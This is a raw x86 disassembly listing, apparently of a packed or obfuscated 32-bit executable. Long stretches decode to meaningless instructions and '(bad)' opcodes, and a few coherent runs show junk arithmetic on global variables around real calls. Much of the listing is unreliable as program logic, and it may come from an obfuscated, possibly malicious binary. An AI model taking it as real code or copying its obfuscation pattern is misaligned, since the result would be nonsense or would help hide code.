  40a653:	mov    edx,0x30d91040
  40a658:	sub    eax,0x203588cf
  40a65d:	inc    edi
  40a65e:	xor    al,0xe8
  40a660:	jp     0x40a5fe
  40a662:	das    
  40a663:	and    ch,BYTE PTR [edx+0x2e]
  40a666:	pop    edi
  40a667:	mov    al,ds:0x627e6a4d
  40a66c:	sub    BYTE PTR [edi],bl
  40a66e:	jl     0x40a604
  40a670:	pop    eax
  40a671:	jnp    0x40a63c
  40a673:	and    DWORD PTR [esi+0x3b394339],ebp
  40a679:	out    dx,al
  40a67a:	shr    BYTE PTR [edx-0x1e],1
  40a67d:	jb     0x40a66f
  40a67f:	cmp    cl,BYTE PTR [edx-0x6082d8ac]
  40a685:	js     0x40a6b3
  40a687:	int3   
  40a688:	fcom   DWORD PTR ds:0x1eb831ad
  40a68e:	jecxz  0x40a703
  40a690:	jo     0x40a6fc
  40a692:	outs   dx,BYTE PTR ds:[esi]
  40a693:	xlat   BYTE PTR ds:[ebx]
  40a694:	cli    
  40a695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a696:	jne    0x40a646
  40a698:	fidivr DWORD PTR [edi-0x22]
  40a69b:	das    
  40a69c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a69d:	js     0x40a6ef
  40a69f:	pop    ss
  40a6a0:	inc    edi
  40a6a1:	sub    edx,ecx
  40a6a3:	hlt    
  40a6a4:	out    dx,al
  40a6a5:	daa    
  40a6a6:	imul   esi,DWORD PTR [ecx],0xec1cee6c
  40a6ac:	enter  0x17fa,0xf3
  40a6b0:	aad    0xd
  40a6b2:	cmp    al,0x1
  40a6b4:	or     eax,0x85dc607b
  40a6b9:	and    ch,dh
  40a6bb:	mov    edi,0xf0b72f96
  40a6c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6c1:	in     eax,0xbd
  40a6c3:	sub    ebp,DWORD PTR [eax]
  40a6c5:	das    
  40a6c6:	xor    edx,eax
  40a6c8:	sbb    ah,dl
  40a6ca:	iret   
  40a6cb:	call   0x52fc:0xa09b4563
  40a6d2:	es enter 0x124a,0xfd
  40a6d7:	test   al,0xe
  40a6d9:	adc    al,0x8
  40a6db:	dec    ebx
  40a6dc:	push   ss
  40a6dd:	mov    eax,ds:0x1a54e561
  40a6e2:	test   al,0xb9
  40a6e4:	mov    dh,0xfe
  40a6e6:	test   al,0x4d
  40a6e8:	les    esp,FWORD PTR [edi+0x3bfb9016]
  40a6ee:	clc    
  40a6ef:	mov    DWORD PTR ds:0x4336eb,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x4336d7,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x433767,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433797
  40a72f:	or     DWORD PTR ds:0x4337a3,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433793,0x433687
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x43372f,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x4336e7,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x43376f,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x43367f,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x43375b
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43368b
  40a793:	sub    DWORD PTR ds:0x4336a3,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x9509ec0c
  40a7ac:	mov    es,WORD PTR [ecx]
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	inc    ebp
  40a7b7:	sub    ecx,ebx
  40a7b9:	es cmp eax,0xa4398d69
  40a7bf:	fld    TBYTE PTR [edx]
  40a7c1:	mov    ebx,0xbd13794
  40a7c6:	das    
  40a7c7:	cmc    
  40a7c8:	div    BYTE PTR [ebx-0x1b35db82]
  40a7ce:	call   0x2ce9059b
  40a7d3:	imul   ecx,eax,0x844a04d4
  40a7d9:	xor    bh,0x84
  40a7dc:	(bad)
  40a7df:	call   0xf97a:0x240d5791
  40a7e6:	iret   
  40a7e7:	or     bl,BYTE PTR [edi+edx*8]
  40a7ea:	daa    
  40a7eb:	fisubr WORD PTR [edi]
  40a7ed:	mov    edi,0xf3615341
  40a7f2:	dec    edx
  40a7f3:	scas   al,BYTE PTR es:[edi]
  40a7f4:	stos   BYTE PTR es:[edi],al
  40a7f5:	ds out 0xeb,eax
  40a7f8:	push   0x70bb26c3
  40a7fd:	pusha  
  40a7fe:	out    0xe0,al
  40a800:	and    al,0x4
  40a802:	mov    ebx,eax
  40a804:	mov    ebx,0x7d2ac148
  40a809:	xchg   ebx,eax
  40a80a:	icebp  
  40a80b:	pop    es
  40a80c:	mov    cl,0x51
  40a80e:	ss in  al,0xf3
  40a811:	test   al,0xfe
  40a813:	in     al,dx
  40a814:	mov    esp,DWORD PTR [ebx+0xd]
  40a817:	adc    DWORD PTR [eax-0x30f4241f],0xffffffc7
  40a81e:	sti    
  40a81f:	pop    ss
  40a820:	adc    eax,0x9d4f754f
  40a825:	adc    DWORD PTR [esi-0x504dba18],ebp
  40a82b:	xchg   DWORD PTR [ecx+0x4bdcb491],eax
  40a831:	dec    esp
  40a832:	in     eax,0x5b
  40a834:	mov    al,ds:0x5d19d7d7
  40a839:	jle    0x40a8b9
  40a83b:	jecxz  0x40a840
  40a83d:	add    edx,esi
  40a83f:	ds pushf 
  40a841:	and    al,0x9e
  40a843:	push   DWORD PTR [eax-0x2aba4898]
  40a849:	fwait
  40a84a:	cwde   
  40a84b:	outs   dx,DWORD PTR ds:[esi]
  40a84c:	(bad)  
  40a84d:	test   eax,0xc55a0bdc
  40a852:	popa   
  40a853:	or     ah,ch
  40a855:	jp     0x40a86f
  40a857:	and    ah,al
  40a859:	cmp    BYTE PTR [esi+edi*1+0x66dbd53f],0xcb
  40a861:	push   ss
  40a862:	or     DWORD PTR [esi-0x41],ecx
  40a865:	jbe    0x40a84e
  40a867:	lock stos BYTE PTR es:[edi],al
  40a869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a86a:	scas   eax,DWORD PTR es:[edi]
  40a86b:	jle    0x40a8c4
  40a86d:	shl    DWORD PTR [ebp+0x21],0xfe
  40a871:	addr16 sbb eax,0xc5065c5e
  40a877:	sub    DWORD PTR [ebp+0x2f],ebx
  40a87a:	dec    ebx
  40a87b:	cld    
  40a87c:	sub    eax,esi
  40a87e:	xor    eax,esi
  40a880:	xor    BYTE PTR [eax],0xeb
  40a883:	addr16 jne 0x40a80e
  40a886:	repnz mov ebx,ecx
  40a889:	ss mov ebx,0x87aa32c4
  40a88f:	retf   
  40a890:	out    dx,al
  40a891:	das    
  40a892:	and    BYTE PTR [edx+eiz*8-0x4915edea],bl
  40a899:	mov    ch,0xec
  40a89b:	push   ecx
  40a89c:	dec    ebx
  40a89d:	add    BYTE PTR [ebx],0xc1
  40a8a0:	inc    esi
  40a8a1:	adc    ebx,DWORD PTR [ecx]
  40a8a3:	jnp    0x40a8bd
  40a8a5:	dec    esi
  40a8a6:	sub    ah,0xc5
  40a8a9:	loope  0x40a877
  40a8ab:	(bad)  
  40a8ad:	cmp    ebx,DWORD PTR [eax-0x39]
  40a8b0:	cmp    al,0xfa
  40a8b2:	bound  ecx,QWORD PTR [ebx+0x29]
  40a8b5:	loope  0x40a897
  40a8b7:	pop    DWORD PTR [ebp+eiz*8+0x58843a8b]
  40a8be:	push   es
  40a8bf:	das    
  40a8c0:	call   0xba9e:0x356c4d77
  40a8c7:	mov    edx,0xd0a8f5db
  40a8cc:	out    dx,eax
  40a8cd:	arpl   WORD PTR [ebx-0x73dbcce],cx
  40a8d3:	dec    ecx
  40a8d5:	dec    ebp
  40a8d6:	pop    es
  40a8d7:	repnz outs dx,DWORD PTR ds:[esi]
  40a8d9:	push   0xffffffac
  40a8db:	push   0xffffffa3
  40a8dd:	add    BYTE PTR [eax],bh
  40a8df:	addr16 aas 
  40a8e1:	cmp    dh,bh
  40a8e3:	mov    esp,0xd84e45e8
  40a8e8:	push   ebx
  40a8e9:	ins    BYTE PTR es:[edi],dx
  40a8ea:	das    
  40a8eb:	into   
  40a8ec:	rcl    DWORD PTR [edi],0x3a
  40a8ef:	jmp    0x2db3c818
  40a8f4:	mov    eax,ds:0x4faea89b
  40a8f9:	xchg   ebx,eax
  40a8fa:	clc    
  40a8fb:	pop    ebp
  40a8fc:	div    DWORD PTR [ebp-0x12d3137a]
  40a902:	int3   
  40a903:	cmp    DWORD PTR [eax+0x546db344],ecx
  40a909:	mov    ah,0x9d
  40a90b:	dec    ebx
  40a90c:	out    0x8a,eax
  40a90e:	ret    0x5623
  40a911:	mov    bl,0x60
  40a913:	(bad)  
  40a914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a915:	or     eax,0x53e98bfd
  40a91a:	xchg   ebp,esp
  40a91c:	push   cx
  40a91e:	jecxz  0x40a8b5
  40a920:	pop    ebx
  40a921:	mov    ebp,eax
  40a923:	xor    al,0x8e
  40a925:	or     cl,BYTE PTR [esi+ebx*8]
  40a928:	mov    esi,0x1ba0045d
  40a92d:	mov    esi,0x36e1462b
  40a932:	ret    
  40a933:	aaa    
  40a934:	mov    ds:0x9771087b,al
  40a939:	shr    DWORD PTR [eax],0x8
  40a93c:	(bad)  
  40a93e:	daa    
  40a93f:	cmp    BYTE PTR [eax],ch
  40a941:	mov    fs,eax
  40a943:	cmp    DWORD PTR [ebp+esi*1-0x3d25b5b6],esi
  40a94a:	inc    esp
  40a94b:	mov    eax,ds:0x36a44fed
  40a950:	(bad)  
  40a951:	call   0x12df:0x9b921d06
  40a958:	jno    0x40a922
  40a95a:	xor    DWORD PTR [edi],edx
  40a95c:	pop    ebx
  40a95d:	cwde   
  40a95e:	call   0x5cf204f5
  40a963:	bound  ebp,QWORD PTR cs:[eax+esi*1+0x7d08a297]
  40a96b:	and    bl,BYTE PTR [esi]
  40a96d:	jb     0x40a9bb
  40a96f:	xchg   esi,eax
  40a970:	mov    ch,0xa3
  40a972:	das    
  40a973:	pop    edx
  40a974:	repz push si
  40a977:	pop    ebp
  40a978:	icebp  
  40a979:	xchg   esp,eax
  40a97a:	push   ecx
  40a97b:	fwait
  40a97c:	outs   dx,BYTE PTR ds:[esi]
  40a97d:	mov    ebx,0xc5055e22
  40a982:	in     al,0x8d
  40a984:	outs   dx,BYTE PTR ds:[esi]
  40a985:	add    eax,esi
  40a987:	xor    al,0xce
  40a989:	(bad)  
  40a98a:	jno    0x40a9d3
  40a98c:	pushf  
  40a98d:	ficom  WORD PTR [edx-0x45]
  40a990:	aam    0x58
  40a992:	mov    cl,0xdd
  40a994:	idiv   BYTE PTR [edi+ecx*4+0x57]
  40a998:	inc    edi
  40a999:	xor    ebp,DWORD PTR [esi+eax*1-0x2]
  40a99d:	rcr    DWORD PTR [edi-0x50],1
  40a9a0:	icebp  
  40a9a1:	lods   al,BYTE PTR ds:[esi]
  40a9a2:	arpl   WORD PTR ds:[eax+0x54],bp
  40a9a6:	nop
  40a9a7:	pop    ebx
  40a9a8:	ja     0x40a939
  40a9aa:	cmp    DWORD PTR [edx-0x27687da2],edx
  40a9b0:	rcl    bl,cl
  40a9b2:	ror    BYTE PTR [esi],1
  40a9b4:	jnp    0x40a960
  40a9b6:	sbb    BYTE PTR [esi+0x2c],0x6
  40a9ba:	and    BYTE PTR [ecx],al
  40a9bc:	jbe    0x40a9aa
  40a9be:	sbb    BYTE PTR [edx-0xc5964fd],bh
  40a9c4:	into   
  40a9c5:	inc    eax
  40a9c6:	shl    ch,0xc0
  40a9c9:	fmul   DWORD PTR [ebx+ebp*4]
  40a9cc:	cld    
  40a9cd:	dec    edx
  40a9ce:	and    BYTE PTR [eax],cl
  40a9d0:	dec    ebp
  40a9d1:	jae    0x40aa28
  40a9d3:	clc    
  40a9d4:	jbe    0x40a988
  40a9d6:	into   
  40a9d7:	fisubr DWORD PTR [eax-0xfac16e3]
  40a9dd:	xchg   ecx,eax
  40a9de:	ins    BYTE PTR es:[edi],dx
  40a9df:	mov    cl,0xc4
  40a9e1:	mov    esi,0x680e448e
  40a9e6:	test   BYTE PTR ds:0x4fe6e59d,al
  40a9ec:	add    eax,0x91fcfec6
  40a9f1:	hlt    
  40a9f2:	push   ecx
  40a9f3:	jle    0x40aa37
  40a9f5:	xchg   BYTE PTR [eax-0x63],al
  40a9f8:	outs   dx,BYTE PTR ds:[esi]
  40a9f9:	jne    0x40aa50
  40a9fb:	sbb    BYTE PTR [ecx+0x458bec45],cl
  40aa01:	cld    
  40aa02:	xor    DWORD PTR ds:0x433697,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433797,0x433767
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x4336e7,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	pop    ebp
  40aa35:	sbb    ah,BYTE PTR [ecx-0x57]
  40aa38:	shr    bl,1
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	xor    ebx,ecx
  40aa42:	or     dl,ah
  40aa44:	jnp    0x40aa15
  40aa46:	and    eax,0x61dff66e
  40aa4b:	into   
  40aa4c:	pop    es
  40aa4d:	out    0x2f,eax
  40aa4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa50:	imul   ecx,DWORD PTR [esi-0x14bcb5b9],0xffffffb4
  40aa57:	add    eax,0xffb753de
  40aa5c:	rol    BYTE PTR [ecx+0x78],0x27
  40aa60:	in     al,dx
  40aa61:	ja     0x40aa76
  40aa63:	out    dx,eax
  40aa64:	cmp    edi,edx
  40aa66:	out    dx,al
  40aa67:	mov    al,0xb8
  40aa69:	nop
  40aa6a:	mov    ecx,0x355396d6
  40aa6f:	and    eax,0x60876d25
  40aa74:	das    
  40aa75:	cmp    BYTE PTR [ebp+0x35],0x50
  40aa79:	cdq    
  40aa7a:	pop    esp
  40aa7b:	xchg   esp,eax
  40aa7c:	(bad)  
  40aa7d:	pop    ecx
  40aa7e:	sub    bl,bh
  40aa80:	call   0x2556:0xb1882c02
  40aa87:	popa   
  40aa88:	loop   0x40aa99
  40aa8a:	loope  0x40aac6
  40aa8c:	sbb    al,0xbb
  40aa8e:	arpl   WORD PTR [edi],sp
  40aa90:	cmp    eax,0x288ae644
  40aa95:	test   eax,0x96ee6043
  40aa9a:	jo     0x40aa51
  40aa9c:	std    
  40aa9d:	dec    ebx
  40aa9e:	add    ch,dl
  40aaa0:	imul   ebx,DWORD PTR [edi+0x529399aa],0x7b
  40aaa7:	aad    0xfe
  40aaa9:	ins    DWORD PTR es:[edi],dx
  40aaaa:	jo     0x40aa50
  40aaac:	aam    0xf4
  40aaae:	mov    ebp,0xcc16293a
  40aab3:	mov    edi,0xf2169089
  40aab8:	jb     0x40aaed
  40aaba:	jl     0x40aa40
  40aabc:	cwde   
  40aabd:	icebp  
  40aabe:	cmp    al,0xa2
  40aac0:	addr16 mov ah,0xa3
  40aac3:	iret   
  40aac4:	aam    0x4c
  40aac6:	dec    ebp
  40aac7:	dec    esi
  40aac8:	add    al,0x11
  40aaca:	(bad)  
  40aacb:	inc    eax
  40aacd:	dec    ebx
  40aace:	push   0x47
  40aad0:	or     ecx,DWORD PTR [edi-0x4a]
  40aad3:	pop    esp
  40aad4:	cmp    eax,0xe7d0daa3
  40aad9:	test   al,0x89
  40aadb:	dec    edi
  40aadc:	cmp    bh,0x2b
  40aadf:	(bad)  
  40aae0:	cmp    eax,0xc3acbf2b
  40aae5:	mov    edi,0xfccd6750
  40aaea:	xchg   DWORD PTR [edi+0x5a],edi
  40aaed:	xchg   edx,eax
  40aaee:	loopne 0x40ab27
  40aaf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aaf1:	arpl   WORD PTR [eax+0x39429602],di
  40aaf7:	pop    esp
  40aaf8:	cmp    esp,eax
  40aafa:	jmp    esi
  40aafc:	lods   eax,DWORD PTR ds:[esi]
  40aafd:	jmp    0x345280a4
  40ab02:	lods   eax,DWORD PTR ds:[esi]
  40ab03:	rol    BYTE PTR [edx],1
  40ab05:	call   0x4a80:0xa5c3a6f1
  40ab0c:	pop    edi
  40ab0d:	push   edi
  40ab0e:	(bad)  
  40ab0f:	push   ds
  40ab10:	xor    edx,DWORD PTR [edi+ecx*2-0x79ff30f]
  40ab17:	in     eax,0x80
  40ab19:	and    BYTE PTR [ecx],0x21
  40ab1c:	sbb    edi,DWORD PTR [edi]
  40ab1e:	add    bh,cl
  40ab20:	ja     0x40aaa8
  40ab22:	mov    WORD PTR [edx],fs
  40ab24:	test   al,0xe7
  40ab26:	mov    ah,0xea
  40ab28:	sbb    DWORD PTR [ebx+0x2380a2c1],ebp
  40ab2e:	cmp    eax,ebp
  40ab30:	xor    DWORD PTR [edx-0x34],0x19
  40ab34:	and    al,0x1b
  40ab36:	dec    edi
  40ab37:	fsub   DWORD PTR [edi]
  40ab39:	daa    
  40ab3a:	cmp    ebx,ecx
  40ab3c:	jmp    0x40aad6
  40ab3e:	mov    al,ds:0xf4cb069b
  40ab43:	(bad)  
  40ab44:	xor    eax,0xe0602330
  40ab49:	ror    BYTE PTR [ecx-0x1c],0x43
  40ab4d:	punpckhdq mm3,QWORD PTR [ebx]
  40ab50:	and    esp,DWORD PTR [ebp-0x5f]
  40ab53:	pop    ebx
  40ab54:	ror    DWORD PTR [edx+0x34],1
  40ab57:	mov    dh,BYTE PTR [ebx+0xbec9ae1]
  40ab5d:	stc    
  40ab5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab5f:	jmp    0x40ab28
  40ab61:	pop    ebp
  40ab62:	sub    eax,eax
  40ab64:	cmp    bl,BYTE PTR [edi+ecx*2+0x4b]
  40ab68:	add    DWORD PTR [esi],ebx
  40ab6a:	cmp    DWORD PTR [edx],0xffffff86
  40ab6d:	cmp    bh,BYTE PTR [edi+0x4e36a487]
  40ab73:	into   
  40ab74:	(bad)  
  40ab75:	mov    ds:0xe55e1a71,al
  40ab7a:	inc    dl
  40ab7c:	add    BYTE PTR [esi+0x58],cl
  40ab7f:	mov    fs,ebx
  40ab81:	dec    esp
  40ab82:	sbb    DWORD PTR [edx+0x6b54b142],edi
  40ab88:	xor    eax,0x64765d5d
  40ab8d:	pusha  
  40ab8e:	aam    0x78
  40ab90:	dec    esp
  40ab91:	int3   
  40ab92:	push   ss
  40ab93:	sbb    ch,BYTE PTR [ecx+0x69]
  40ab96:	push   ecx
  40ab97:	and    edi,DWORD PTR [ecx+0x3898911c]
  40ab9d:	mov    esp,0x8042f827
  40aba2:	mov    ebp,0x4eb4c145
  40aba7:	mov    ds:0x8e7d5d11,al
  40abac:	adc    DWORD PTR [ecx],0xffffff96
  40abaf:	sbb    cl,BYTE PTR [ebp+eax*2+0x19]
  40abb3:	cld    
  40abb4:	les    edi,FWORD PTR [ecx]
  40abb6:	xchg   ecx,eax
  40abb7:	mov    ebx,DWORD PTR [eax+0x55708392]
  40abbd:	adc    edx,DWORD PTR [esi]
  40abbf:	pop    ebp
  40abc0:	stos   BYTE PTR es:[edi],al
  40abc1:	scas   eax,DWORD PTR es:[edi]
  40abc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abc3:	out    0x5,al
  40abc5:	inc    ecx
  40abc6:	push   edx
  40abc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abc8:	retf   
  40abc9:	(bad)  
  40abca:	shl    cl,1
  40abcc:	xchg   ecx,eax
  40abcd:	setno  BYTE PTR [ecx]
  40abd0:	fwait
  40abd1:	pusha  
  40abd2:	out    dx,al
  40abd3:	mov    eax,ds:0x69821b6
  40abd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abd9:	push   cs
  40abda:	(bad)  
  40abdb:	cmp    bh,BYTE PTR [ebx+0x38]
  40abde:	mov    ah,0x8
  40abe0:	mov    al,ds:0x3fd33950
  40abe5:	xor    DWORD PTR [eax],edx
  40abe7:	rol    DWORD PTR [edx],1
  40abe9:	fdiv   DWORD PTR [edi]
  40abeb:	stos   DWORD PTR es:[di],eax
  40abed:	loope  0x40ac48
  40abef:	cs sbb eax,0x93fd18ec
  40abf5:	icebp  
  40abf6:	xchg   ebp,eax
  40abf7:	scas   al,BYTE PTR es:[edi]
  40abf8:	lea    eax,[esi+edi*1]
  40abfb:	add    al,0x26
  40abfd:	popa   
  40abfe:	pop    eax
  40abff:	xor    eax,DWORD PTR [ebp-0x2eae68aa]
  40ac05:	mov    bl,BYTE PTR [esi+0xe]
  40ac08:	clc    
  40ac09:	mov    ebx,0x57a22f2a
  40ac0e:	dec    ebp
  40ac0f:	sub    eax,0x28fbd2d4
  40ac14:	adc    DWORD PTR [ecx-0x6e],edi
  40ac17:	cmp    eax,0x70e98b80
  40ac1c:	mov    eax,ds:0xc6e1c7bc
  40ac21:	movd   eax,mm2
  40ac24:	sahf   
  40ac25:	aaa    
  40ac26:	lock (bad) 
  40ac28:	xchg   ebp,eax
  40ac29:	inc    edx
  40ac2a:	icebp  
  40ac2b:	imul   edi,DWORD PTR [edx+0x5f],0xa342db67
  40ac32:	(bad)  
  40ac33:	push   esi
  40ac34:	idiv   esi
  40ac36:	in     eax,0xfb
  40ac38:	ror    DWORD PTR [eax+0xd],0x7e
  40ac3c:	jl     0x40abe5
  40ac3e:	dec    ebp
  40ac3f:	retf   
  40ac40:	test   al,0xd0
  40ac42:	ret    
  40ac43:	jecxz  0x40abdf
  40ac45:	sti    
  40ac46:	ret    0x5b64
  40ac49:	imul   eax,DWORD PTR [bx+0x2e78],0x2738368f
  40ac52:	outs   dx,BYTE PTR ds:[esi]
  40ac53:	or     dl,ah
  40ac55:	pop    ss
  40ac56:	jmp    0x74dcfa9f
  40ac5b:	and    BYTE PTR [ecx+0x53d0c565],bl
  40ac61:	push   0x6b
  40ac63:	aaa    
  40ac64:	ret    0xd76
  40ac67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac68:	sub    DWORD PTR [esi-0x79fbaa6f],ebx
  40ac6e:	idiv   DWORD PTR [eax]
  40ac70:	loope  0x40aced
  40ac72:	call   0xf38fbbde
  40ac77:	call   0x8b2a:0x587aceab
  40ac7e:	pop    esi
  40ac7f:	mov    esp,0x5655876d
  40ac84:	jbe    0x40acdf
  40ac86:	cmp    ecx,eax
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x4336eb,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x43376f,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x43376f
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x43376f,ecx
  40acb4:	cmp    DWORD PTR ds:0x43376f,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433808
  40acc6:	push   0x43384c
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x43376f,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x43376f
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x43376f,ecx
  40acf7:	cmp    DWORD PTR ds:0x43376f,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43371f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x6cf2860e],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40adab
  40ad2c:	xor    BYTE PTR [ecx+esi*8-0x73],al
  40ad30:	mov    edi,0x31fa52eb
  40ad35:	test   eax,0xd9bef745
  40ad3a:	xchg   ebx,eax
  40ad3b:	and    BYTE PTR [ecx+0x41eba087],0x55
  40ad42:	dec    ebx
  40ad43:	stc    
  40ad44:	int    0x34
  40ad46:	xor    BYTE PTR [edi],ah
  40ad48:	test   eax,0x2cb01ee6
  40ad4d:	or     al,0x11
  40ad4f:	mov    ds:0xb6c7a0e1,al
  40ad54:	(bad)  
  40ad55:	sub    eax,0x1c9b5f45
  40ad5a:	mov    edi,0xd70502c6
  40ad5f:	xchg   DWORD PTR [ebx-0x305dc54b],ebp
  40ad65:	jne    0x40ad74
  40ad67:	lds    esi,FWORD PTR ds:0x598cb4c2
  40ad6d:	jge    0x40ad12
  40ad6f:	mov    al,0x59
  40ad71:	in     al,dx
  40ad72:	push   ss
  40ad73:	add    eax,0x65a31f05
  40ad78:	xor    eax,0xc7b2861
  40ad7d:	mov    dh,0xe6
  40ad7f:	push   eax
  40ad80:	(bad)  
  40ad81:	nop
  40ad82:	dec    edi
  40ad83:	xor    BYTE PTR [ebx+eiz*8+0x455c0476],0xd6
  40ad8b:	pop    es
  40ad8c:	repnz pop ds
  40ad8e:	dec    eax
  40ad8f:	fst    QWORD PTR [eax]
  40ad91:	aam    0x91
  40ad93:	imul   eax,DWORD PTR [ebp-0x42f4455f],0x35
  40ad9a:	xchg   esi,edx
  40ad9c:	dec    ebx
  40ad9d:	scas   al,BYTE PTR es:[edi]
  40ad9e:	retf   0xdd49
  40ada1:	cmp    eax,0x4f099985
  40ada6:	cmp    BYTE PTR [edx],dh
  40ada8:	xor    ch,BYTE PTR [ecx-0x74]
  40adab:	data16 mov dl,0xc
  40adae:	aas    
  40adaf:	inc    ebx
  40adb0:	dec    edx
  40adb1:	in     al,dx
  40adb2:	pop    es
  40adb3:	mov    al,0x49
  40adb5:	mov    al,ds:0xeb429fd
  40adba:	mov    esp,0x6bd5e791
  40adbf:	cmp    dh,al
  40adc1:	cmp    al,0x13
  40adc3:	dec    edx
  40adc4:	xchg   edi,edi
  40adc6:	mov    cs,WORD PTR [ecx+ebx*4]
  40adc9:	push   edi
  40adca:	ja     0x40ade9
  40adcc:	scas   al,BYTE PTR es:[edi]
  40adcd:	mov    ah,0x14
  40adcf:	xor    ebp,0xffffff8c
  40add2:	pop    eax
  40add3:	mov    BYTE PTR [edx+ebp*2+0x63b02299],ah
  40adda:	add    al,0x34
  40addc:	sar    DWORD PTR [edx+0x6e67a83f],0xca
  40ade3:	jo     0x40add0
  40ade5:	pop    ss
  40ade6:	xchg   ebp,eax
  40ade7:	pusha  
  40ade8:	stc    
  40ade9:	adc    al,0xa4
  40adeb:	add    DWORD PTR [esi-0x11],esi
  40adee:	jmp    0x40ae62
  40adf0:	jne    0x40ae6b
  40adf2:	imul   edx,edi,0x4223aee2
  40adf8:	aaa    
  40adf9:	(bad)  
  40adfa:	dec    edi
  40adfb:	xor    al,0xad
  40adfd:	sbb    eax,0xc9939d0b
  40ae02:	ror    DWORD PTR [ebx+0x79],cl
  40ae05:	imul   eax,DWORD PTR [eax-0x11089a4e],0x70257950
  40ae0f:	daa    
  40ae10:	xchg   DWORD PTR [ebp+0x25],edi
  40ae13:	inc    ebp
  40ae14:	mov    ds:0x69e2f531,al
  40ae19:	loope  0x40ae25
  40ae1b:	jbe    0x40ae7b
  40ae1d:	mov    al,0xe8
  40ae1f:	or     bl,BYTE PTR [ecx]
  40ae21:	hlt    
  40ae22:	daa    
  40ae23:	fistp  DWORD PTR [edx+0x6cc56b0b]
  40ae29:	xor    ebx,DWORD PTR [ecx+0x3870bb89]
  40ae2f:	xchg   edi,eax
  40ae30:	push   ss
  40ae31:	addr16 jg 0x40ae30
  40ae34:	add    DWORD PTR [eax+0x22],ecx
  40ae37:	cmc    
  40ae38:	pop    ss
  40ae39:	fcomi  st,st(1)
  40ae3b:	sti    
  40ae3c:	hlt    
  40ae3d:	jge    0x40ae3d
  40ae3f:	mov    DWORD PTR [ebx+0x31],edx
  40ae42:	jmp    0x973c:0x2ead7b42
  40ae49:	xchg   BYTE PTR [edi+0x1a],ah
  40ae4c:	and    DWORD PTR [eax+ebp*8+0x4df468d1],ecx
  40ae53:	push   edi
  40ae54:	(bad)  
  40ae55:	dec    ebp
  40ae56:	adc    esi,DWORD PTR [ebp-0x58]
  40ae59:	push   ss
  40ae5a:	and    ecx,DWORD PTR [edx]
  40ae5c:	(bad)  
  40ae5d:	aas    
  40ae5e:	xor    esi,DWORD PTR [eax]
  40ae60:	dec    ecx
  40ae61:	push   ss
  40ae62:	(bad)  
  40ae63:	pop    eax
